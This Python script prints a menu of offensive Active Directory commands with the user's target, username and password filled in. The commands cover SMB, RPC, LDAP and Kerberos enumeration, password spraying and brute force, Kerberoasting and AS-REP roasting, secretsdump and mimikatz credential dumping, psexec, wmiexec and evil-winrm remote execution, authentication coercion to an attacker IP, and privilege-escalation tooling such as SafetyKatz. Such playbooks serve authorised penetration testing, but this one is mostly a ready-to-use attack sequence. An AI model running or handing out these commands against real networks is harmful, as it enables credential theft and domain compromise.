#!/usr/bin/env python3

import sys,argparse
from colorama import Fore, Back, Style

red=Fore.RED
green=Fore.GREEN
blue=Fore.BLUE
reset=Fore.RESET + Back.RESET
prefix = red + "[" + blue
suffix = red + "]" + reset
star = blue + "[" + green + "*" + blue + "]" + reset 
warn = Back.YELLOW + Fore.RED

def help():
    parser.print_help()
    print("\n\nUsage:")
    title("Nologin Checks:")
    commands(f"{sys.argv[0]} -t 10.10.10.10 -n ")
    title("Network User Enumeration")
    commands(f"{sys.argv[0]} -t 10.10.10.10 -u user -m enum")
    commands(f"{sys.argv[0]} -t 10.10.10.10 -p password -m enum ")
    title("Module Specifi Commands")
    commands(f"{sys.argv[0]} -t 10.10.10.10 -u user -p password -m modulename")
    print("\t -m enum = Enumeration Module")
    print("\t -m exp = Exploitation Module")
    print("\t -m priv = Privilege Escalation Module")
    title("Privilege Escaation Commands")
    commands(f"{sys.argv[0]} -m priv")
    commands(f"{sys.argv[0]} -t 10.10.10.10 -u user -p password -m priv")

def title(heading):
    print(f"{prefix} {heading} {suffix}")

def commands(command):
    print(f"\t{star}{command}")

def warning(warning):
    print(f"{warn}{warning}{reset}")

def anon_checks():
    title("SMB Check: ")
    commands(f"smbclient -L \\\\{args.target} -I {args.target} -N")
    commands(f"smbclient \\\\\\{args.target}\\\\sharename -I {args.target} -N")
    commands(f"enum4linux -a {args.target}")
    
    title("RPC Check: ")
    commands(f"rpcclient -U '' -N {args.target}")
    
    title("LDAP Check: ")
    commands(f"ldapsearch -LLL -x -H ldap://{args.target} -b'' -s base '(objectclass=\*)'")
    
    title("Kerberos Check: ")
    commands(f"kerbrute userenum -d {args.target} usernames.txt")
    
    title("Bloodhound Check: ")
    commands(f"bloodhound.py -d {args.domain} -v --zip -c All -dc {args.domain} -ns {args.target}")


def domain_enumeration():
    title("SMB Check: ")
    commands(f"smbclient -L \\\\{args.target} -I {args.target} -U {args.user} {args.password}")
    commands(f"smbclient \\\\\\{args.domain}\\\\sharename -I {args.target} -U {args.user} {args.password}")
    commands(f"enum4linux -u {args.user} -p {args.password} -a {args.target}")
    commands(f"python3 smbclient.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"crackmapexec smb {args.target} -u '{args.user}' -p '{args.password}' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol")
    
    title("RPC Check: ")
    commands(f"python3 services.py {args.domain}/{args.user}:{args.password}@{args.password} list")
    commands(f"python3 samrdump.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"python3 rpcdump.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"python3 lookupsid.py {args.domain}/{args.user}:{args.password}@{args.target}")
    
    title("Kerberos Check: ")
    commands(f"python3 windapsearch --dc-ip {args.target} -u {args.domain}\\{args.user} -p {args.password} -U -G --da -m \"Remote Desktop Users\" -C -r")
    commands(f"python3 GetADUsers.py -all {args.domain}/{args.user}:{args.password} -dc-ip {args.target}")
    
    title("LDAP Check: ")
    commands(f"bloodhound.py -u {args.user} -p {args.password} -d {args.domain} -v --zip -c All -dc {args.domain} -ns {args.target}")


def domain_exploitation():
    title("Kerberos Exploitation")
    commands(f"python3 GetUserSPNs.py {args.domain}/{args.user}:{args.password} -dc-ip {args.target} -request")
    commands(f"python3 secretsdump.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"python3 mimikatz.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"python3 targetedKerberoast.py -d {args.domain} -u {args.user} -p {args.password} --dc-ip {args.password}")
    commands(f"python3 pywhisker.py -d \"{args.domain}\" -u \"{args.user}\" -p \"{args.password}\" --target \"user2\" --action \"list\" --dc-ip \"{args.target}\"")
    commands(f"python3 getST.py -spn www/server01.test.local -dc-ip {args.target} -impersonate Administrator {args.domain}/{args.user}:{args.password}")
    
    title("SMB Exploitation")
    commands(f"crackmapexec smb {args.target} -u '{args.user}' -p '{args.password}' -X 'whoami'")
    commands(f"python3 smbexec.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"python3 psexec.py {args.domain}/{args.user}:{args.password}@{args.target}")
    commands(f"python3 atexec.py {args.domain}/{args.user}:{args.password}@{args.target} whoami")
    commands(f"python3 addcomputer.py -method SAMR -dc-ip {args.target} -computer-pass TestPassword321 -computer-name testComputer {args.domain}/{args.user}:{args.password}")
    commands(f"python3 reg.py {args.domain}/{args.user}:{args.password}@{args.target} query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s")

    title("RPC Exploitation")
    commands(f"python3 dementor.py -u {args.user} -p {args.password} -d {args.domain} <attackerIP> {args.target}")

    title("LDAP Exploitation")
    commands(f"python3 addcomputer.py -method LDAPS -dc-ip {args.target} -computer-pass TestPassword321 -computer-name testComputer {args.domain}/{args.user}:{args.password}")

    title("WMI Exploitation")
    commands(f"evil-winrm -i {args.target} -u {args.user} -p {args.password}")
    commands(f"python3 wmiexec.py {args.domain}/{args.user}:{args.password}@{args.target}")

    title("DCOM Exploitation")
    commands(f"python3 dcomexec.py -object MMC20 {args.domain}/{args.user}:{args.password}@{args.target}")


parser = argparse.ArgumentParser(description=f"{prefix} wadcoms.github.io {suffix}  Wadcom Author: @JohnWoodman15; Script By: @DhaneshSivasamy",epilog="Happy Hacking :)")
parser.add_argument("-t", "--target", help="target ip",metavar="")
parser.add_argument("-u", "--user", help="Username",metavar="")
parser.add_argument("-p", "--password",help="Password",metavar="")
parser.add_argument("-m", "--module", help="Module:(enum, exp, priv)", metavar="")
parser.add_argument("-d", "--domain", help="Domain Name",metavar="",default="attack.local")
parser.add_argument("-n", "--nologin", help="NoLogin Checks", action="store_true")
args = parser.parse_args()

# requires target ==> Pass
if args.nologin and not args.target:
    warning("Please Provide me with a target: -t 10.10.10.10")
    help()
    sys.exit(1)

# kicks in when -n is passed, does not function when -n is not provided ==> Pass
elif args.nologin and args.target:
    anon_checks()

# user and password but no target  ==> Pass
elif args.user and args.password and not args.target:
    warning(f"Provide a target for the user {args.user}: {args.password}")
    help()

# username and target but no password and target shows the enum module ==> Pass
elif args.user and args.target and not args.module and not args.password :
    warning("Provide me with '-m enum' to enumerate password")
    help()

# target and user = enumerate password ==> Pass
elif args.target and args.user and args.module=="enum" and not args.password:
    title("Enumerate Domain password:")
    commands(f"kerbrute bruteuser -d {args.domain} passwords.txt {args.user}")

# password and target but no module and username shows the enum module ==> Pass
elif args.password and args.target and not args.module and not args.user :
    warning("Provide me with '-m enum' to enumerate domain users")
    help()

# target and password = enumerate user ==> Pass
elif args.target and args.password and args.module=="enum" and not args.user:
    title("Enumerate Password for domain user")
    commands(f"kerbrute passwordspray -d {args.domain} domain_users.txt {args.password}")
    commands(f"kerbrute userenum -d {args.domain} --dc {args.target} users.txt -o usernames.txt")
    commands(f"python3 GetNPUsers.py {args.domain}/ -dc-ip {args.target} -usersfile usernames.txt -format hashcat -outputfile hashes.txt")

elif args.target and args.user and args.password and not args.module: 
    warning("Provide me with a module")
    help()

# target, user and password = enumerate network ==> Pass
elif args.target and args.user and args.password and args.module=="enum":
    domain_enumeration()

# target, password and exp module = ask user ==> Pass
elif args.target and args.password and args.module == "exp" and not args.user:
    warning("Provide me with a user '-u user'")
    help()

# target, user and exp module = ask password ==> Pass
elif args.target and args.user and args.module == "exp" and not args.password:
    warning("Provide me with a user '-p password'")
    help()

# target, user and password = exploit network ==> Pass
elif args.target and args.user and args.password and args.module=="exp":
    domain_exploitation()

# just the priv module ==> Pass
elif args.module == "priv" and not args.password and not args.user and not args.target:
    title("Privilege Escalation")
    commands("winpeas.exe cmd > output.txt")
    commands("SharpUp.exe > output.txt")
    commands("SharpHound.exe --CollectionMethod All --ZipFileName output.zip")
    commands("SharpDump.exe")
    commands("Seatbelt.exe -group=all -full > output.txt")
    commands("SafetyKatz.exe")

# target, user and password = priv esc ==> Pass
elif args.target and args.user and args.password and args.module == "priv":
    title("Privilege Escalation")
    commands("winpeas.exe cmd > output.txt")
    commands("SharpUp.exe > output.txt")
    commands("SharpHound.exe --CollectionMethod All --ZipFileName output.zip")
    commands(f"SharpHound.exe --CollectionMethod All --LdapUsername {args.user} --LdapPassword {args.password} --ZipFileName output.zip")
    commands("SharpDump.exe")
    commands("Seatbelt.exe -group=all -full > output.txt")
    commands("SafetyKatz.exe")

# print help
else:
    print("*"*60)
    help()
    print("*"*60)
